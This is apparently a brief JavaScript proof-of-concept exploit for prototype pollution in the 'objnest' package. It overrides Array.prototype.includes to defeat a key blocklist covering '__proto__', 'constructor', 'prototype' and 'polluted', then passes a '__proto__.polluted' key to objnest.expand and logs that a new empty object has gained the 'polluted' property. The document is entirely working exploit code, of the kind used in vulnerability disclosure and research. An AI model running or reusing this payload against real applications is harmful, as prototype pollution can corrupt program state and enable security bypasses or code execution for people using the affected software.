Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const objnest = require('objnest');
let obj = {};
console.log({}.polluted);
objnest.expand({ '__proto__.polluted': 'yes' });
console.log({}.polluted);